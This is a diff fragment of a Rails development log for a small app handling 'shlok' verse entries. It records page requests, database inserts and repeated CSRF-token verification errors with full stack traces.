+actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
+rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
+rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
+activerecord (6.1.4.4) lib/active_record/migration.rb:601:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
+web-console (4.2.0) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.2.0) lib/web_console/middleware.rb:19:in `block in call'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `block in tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:37:in `tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `tagged'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.4.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/static.rb:24:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:119:in `call'
+rack-mini-profiler (2.3.3) lib/mini_profiler/profiler.rb:393:in `call'
+webpacker (5.4.3) lib/webpacker/dev_server_proxy.rb:25:in `perform_request'
+rack-proxy (0.7.0) lib/rack/proxy.rb:63:in `call'
+railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/rack/thread_handler_extension.rb:97:in `process_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:157:in `accept_and_process_next_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:110:in `main_loop'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler.rb:415:in `block (3 levels) in start_threads'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/utils.rb:113:in `block in create_thread_and_abort_on_exception'
+Started POST "/shlok/ashlokcp" for 103.37.201.183 at 2022-01-05 13:49:16 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokcp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"a", "shlok"=>"b", "translation"=>"c", "commit"=>"अग्रेस्थापनं करोतु"}
+Can't verify CSRF token authenticity.
+Completed 422 Unprocessable Entity in 1ms (ActiveRecord: 0.0ms | Allocations: 581)
+
+
+  
+ActionController::InvalidAuthenticityToken (ActionController::InvalidAuthenticityToken):
+  
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:211:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:243:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:238:in `verify_authenticity_token'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:427:in `block in make_lambda'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:198:in `block (2 levels) in halting'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:34:in `block (2 levels) in <module:Callbacks>'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:199:in `block in halting'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `block in invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `each'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:115:in `block in run_callbacks'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
+activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
+activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
+actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
+actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
+rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
+rack (2.2.3) lib/rack/etag.rb:27:in `call'
+rack (2.2.3) lib/rack/conditional_get.rb:40:in `call'
+rack (2.2.3) lib/rack/head.rb:12:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
+rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
+rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
+activerecord (6.1.4.4) lib/active_record/migration.rb:601:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
+web-console (4.2.0) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.2.0) lib/web_console/middleware.rb:19:in `block in call'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `block in tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:37:in `tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `tagged'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.4.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/static.rb:24:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:119:in `call'
+rack-mini-profiler (2.3.3) lib/mini_profiler/profiler.rb:393:in `call'
+webpacker (5.4.3) lib/webpacker/dev_server_proxy.rb:25:in `perform_request'
+rack-proxy (0.7.0) lib/rack/proxy.rb:63:in `call'
+railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/rack/thread_handler_extension.rb:97:in `process_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:157:in `accept_and_process_next_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:110:in `main_loop'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler.rb:415:in `block (3 levels) in start_threads'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/utils.rb:113:in `block in create_thread_and_abort_on_exception'
+Started GET "/shlok/ashlokc" for 103.37.201.183 at 2022-01-05 13:49:24 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokc as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokc.html.erb within layouts/application
+  Rendered shlok/ashlokc.html.erb within layouts/application (Duration: 1.4ms | Allocations: 423)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.6ms | Allocations: 3412)
+Completed 200 OK in 8ms (Views: 7.1ms | ActiveRecord: 0.0ms | Allocations: 3813)
+
+
+Started GET "/shlok/ashlokc" for 103.37.201.183 at 2022-01-05 13:54:32 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  [1m[35m (1.1ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by ShlokController#ashlokc as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokc.html.erb within layouts/application
+  Rendered shlok/ashlokc.html.erb within layouts/application (Duration: 2.5ms | Allocations: 1162)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 12.7ms | Allocations: 8035)
+Completed 200 OK in 22ms (Views: 16.4ms | ActiveRecord: 0.0ms | Allocations: 11675)
+
+
+Started POST "/shlok/ashlokcp" for 103.37.201.183 at 2022-01-05 13:54:39 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokcp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"a", "shlok"=>"b", "translation"=>"c", "commit"=>"अग्रेस्थापनं करोतु"}
+  [1m[36mTRANSACTION (0.9ms)[0m  [1m[35mBEGIN[0m
+  ↳ app/controllers/shlok_controller.rb:26:in `ashlokcp'
+  [1m[36mShlok Create (2.8ms)[0m  [1m[32mINSERT INTO "shloks" ("title", "shlok", "translation") VALUES ($1, $2, $3) RETURNING "sid"[0m  [["title", "a"], ["shlok", "b"], ["translation", "c"]]
+  ↳ app/controllers/shlok_controller.rb:26:in `ashlokcp'
+  [1m[36mTRANSACTION (3.3ms)[0m  [1m[35mCOMMIT[0m
+  ↳ app/controllers/shlok_controller.rb:26:in `ashlokcp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 44ms (ActiveRecord: 13.7ms | Allocations: 6658)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 13:54:40 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.5ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 6.0ms | Allocations: 1619)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 16.4ms | Allocations: 4729)
+Completed 200 OK in 20ms (Views: 17.0ms | ActiveRecord: 1.5ms | Allocations: 5411)
+
+
+Started GET "/shlok/5" for 103.37.201.183 at 2022-01-05 14:07:32 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"5"}
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 5], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 1.8ms | Allocations: 758)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.0ms | Allocations: 3820)
+Completed 200 OK in 36ms (Views: 9.7ms | ActiveRecord: 10.8ms | Allocations: 10842)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 14:09:09 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (7.1ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 10.0ms | Allocations: 1031)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 26.2ms | Allocations: 4015)
+Completed 200 OK in 27ms (Views: 19.6ms | ActiveRecord: 7.1ms | Allocations: 4465)
+
+
+Started GET "/shlok/5" for 103.37.201.183 at 2022-01-05 14:09:39 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"5"}
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 5], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 2.7ms | Allocations: 430)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.6ms | Allocations: 3404)
+Completed 200 OK in 13ms (Views: 8.4ms | ActiveRecord: 0.9ms | Allocations: 4496)
+
+
+Started POST "/shlok/5" for 103.37.201.183 at 2022-01-05 14:09:43 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokup as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"CONTRADICTORY MEANING", "shlok"=>"b", "translation"=>"c", "commit"=>"अग्रेस्थापनं करोतु", "id"=>"5"}
+Can't verify CSRF token authenticity.
+Completed 422 Unprocessable Entity in 1ms (ActiveRecord: 0.0ms | Allocations: 640)
+
+
+  
+ActionController::InvalidAuthenticityToken (ActionController::InvalidAuthenticityToken):
+  
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:211:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:243:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:238:in `verify_authenticity_token'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:427:in `block in make_lambda'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:198:in `block (2 levels) in halting'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:34:in `block (2 levels) in <module:Callbacks>'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:199:in `block in halting'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `block in invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `each'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:115:in `block in run_callbacks'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
+activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
+activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
+actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
+actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
+rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
+rack (2.2.3) lib/rack/etag.rb:27:in `call'
+rack (2.2.3) lib/rack/conditional_get.rb:40:in `call'
+rack (2.2.3) lib/rack/head.rb:12:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
+rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
+rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
+activerecord (6.1.4.4) lib/active_record/migration.rb:601:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
+web-console (4.2.0) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.2.0) lib/web_console/middleware.rb:19:in `block in call'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `block in tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:37:in `tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `tagged'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.4.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/static.rb:24:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:119:in `call'
+rack-mini-profiler (2.3.3) lib/mini_profiler/profiler.rb:393:in `call'
+webpacker (5.4.3) lib/webpacker/dev_server_proxy.rb:25:in `perform_request'
+rack-proxy (0.7.0) lib/rack/proxy.rb:63:in `call'
+railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/rack/thread_handler_extension.rb:97:in `process_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:157:in `accept_and_process_next_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:110:in `main_loop'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler.rb:415:in `block (3 levels) in start_threads'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/utils.rb:113:in `block in create_thread_and_abort_on_exception'
+Started POST "/shlok/5" for 103.37.201.183 at 2022-01-05 14:09:59 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  [1m[35m (0.9ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by ShlokController#ashlokup as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"CONTRADICTORY MEANING", "shlok"=>"b", "translation"=>"c", "commit"=>"अग्रेस्थापनं करोतु", "id"=>"5"}
+Can't verify CSRF token authenticity.
+Completed 422 Unprocessable Entity in 5ms (ActiveRecord: 0.0ms | Allocations: 1052)
+
+
+  
+ActionController::InvalidAuthenticityToken (ActionController::InvalidAuthenticityToken):
+  
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:211:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:243:in `handle_unverified_request'
+actionpack (6.1.4.4) lib/action_controller/metal/request_forgery_protection.rb:238:in `verify_authenticity_token'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:427:in `block in make_lambda'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:198:in `block (2 levels) in halting'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:34:in `block (2 levels) in <module:Callbacks>'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:199:in `block in halting'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `block in invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `each'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:512:in `invoke_before'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:115:in `block in run_callbacks'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:137:in `run_callbacks'
+actionpack (6.1.4.4) lib/abstract_controller/callbacks.rb:41:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/rescue.rb:22:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:34:in `block in process_action'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `block in instrument'
+activesupport (6.1.4.4) lib/active_support/notifications/instrumenter.rb:24:in `instrument'
+activesupport (6.1.4.4) lib/active_support/notifications.rb:203:in `instrument'
+actionpack (6.1.4.4) lib/action_controller/metal/instrumentation.rb:33:in `process_action'
+actionpack (6.1.4.4) lib/action_controller/metal/params_wrapper.rb:249:in `process_action'
+activerecord (6.1.4.4) lib/active_record/railties/controller_runtime.rb:27:in `process_action'
+actionpack (6.1.4.4) lib/abstract_controller/base.rb:165:in `process'
+actionview (6.1.4.4) lib/action_view/rendering.rb:39:in `process'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:190:in `dispatch'
+actionpack (6.1.4.4) lib/action_controller/metal.rb:254:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:50:in `dispatch'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:33:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:50:in `block in serve'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `each'
+actionpack (6.1.4.4) lib/action_dispatch/journey/router.rb:32:in `serve'
+actionpack (6.1.4.4) lib/action_dispatch/routing/route_set.rb:842:in `call'
+rack (2.2.3) lib/rack/tempfile_reaper.rb:15:in `call'
+rack (2.2.3) lib/rack/etag.rb:27:in `call'
+rack (2.2.3) lib/rack/conditional_get.rb:40:in `call'
+rack (2.2.3) lib/rack/head.rb:12:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/permissions_policy.rb:22:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/http/content_security_policy.rb:18:in `call'
+rack (2.2.3) lib/rack/session/abstract/id.rb:266:in `context'
+rack (2.2.3) lib/rack/session/abstract/id.rb:260:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/cookies.rb:689:in `call'
+activerecord (6.1.4.4) lib/active_record/migration.rb:601:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:27:in `block in call'
+activesupport (6.1.4.4) lib/active_support/callbacks.rb:98:in `run_callbacks'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/callbacks.rb:26:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/actionable_exceptions.rb:18:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/debug_exceptions.rb:29:in `call'
+web-console (4.2.0) lib/web_console/middleware.rb:132:in `call_app'
+web-console (4.2.0) lib/web_console/middleware.rb:19:in `block in call'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `catch'
+web-console (4.2.0) lib/web_console/middleware.rb:17:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/show_exceptions.rb:33:in `call'
+railties (6.1.4.4) lib/rails/rack/logger.rb:37:in `call_app'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `block in call'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `block in tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:37:in `tagged'
+activesupport (6.1.4.4) lib/active_support/tagged_logging.rb:99:in `tagged'
+railties (6.1.4.4) lib/rails/rack/logger.rb:26:in `call'
+sprockets-rails (3.4.2) lib/sprockets/rails/quiet_assets.rb:13:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/remote_ip.rb:81:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/request_id.rb:26:in `call'
+rack (2.2.3) lib/rack/method_override.rb:24:in `call'
+rack (2.2.3) lib/rack/runtime.rb:22:in `call'
+activesupport (6.1.4.4) lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/executor.rb:14:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/static.rb:24:in `call'
+rack (2.2.3) lib/rack/sendfile.rb:110:in `call'
+actionpack (6.1.4.4) lib/action_dispatch/middleware/host_authorization.rb:119:in `call'
+rack-mini-profiler (2.3.3) lib/mini_profiler/profiler.rb:393:in `call'
+webpacker (5.4.3) lib/webpacker/dev_server_proxy.rb:25:in `perform_request'
+rack-proxy (0.7.0) lib/rack/proxy.rb:63:in `call'
+railties (6.1.4.4) lib/rails/engine.rb:539:in `call'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/rack/thread_handler_extension.rb:97:in `process_request'
